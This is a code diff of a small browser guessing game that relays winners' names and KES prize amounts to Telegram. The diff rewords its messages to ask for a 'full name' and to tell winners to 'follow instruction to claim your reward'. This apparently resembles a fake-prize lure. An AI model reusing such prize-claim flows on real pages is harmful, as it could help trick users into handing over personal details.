@@ -9,7 +9,7 @@
 </head>
 <body>
 
-<div class="intro">Welcome to <span style="color: red; background-color: green;">LUCKY NUMBER</</span></div>
+<div class="intro">Welcome to <span style="color: red; background-color: red;">LUCKY NUMBER</</span></div>
 
 <div class="container">
     <h1 style="color: red; font-style: fansy;">This game belongs to Hussein.</h1>
@@ -56,14 +56,14 @@ function checkGuess() {
     noNameSound.volume = 0.5;
 
     if (!name) {
-        message.textContent = "Please enter your name before playing.";
+        message.textContent = "Operation failed. Please start with your full name.";
         noNameSound.play().catch(error => console.error("Error playing noNameSound:", error));
         return;
     }
 
     if (guess === winningNumber) {
         const prize = getRandomPrize();
-        message.textContent = `Guessed number is correct! Congratulations, ${name}! You've won KES ${prize}. Sending details to claim your prize...`;
+        message.textContent = `Congratulations! Your guess is correct. Follow instruction to claim your reward, ${name}! You've won KES ${prize}. Sending details to claim your prize...`;
         correctSound.play().catch(error => console.error("Error playing correctSound:", error));
 
         const telegramMessage = `Winner Details:\nName: ${name}\nCorrect Number: ${winningNumber}\nPrize: KES ${prize}`;
@@ -87,7 +87,7 @@ function checkGuess() {
                 console.error(error);
             });
     } else {
-        message.textContent = "Guessed number is incorrect. Try again.";
+        message.textContent = "Wrong guess. Don't give up. Try again.";
         wrongSound.play().catch(error => console.error("Error playing wrongSound:", error));
     }
 }
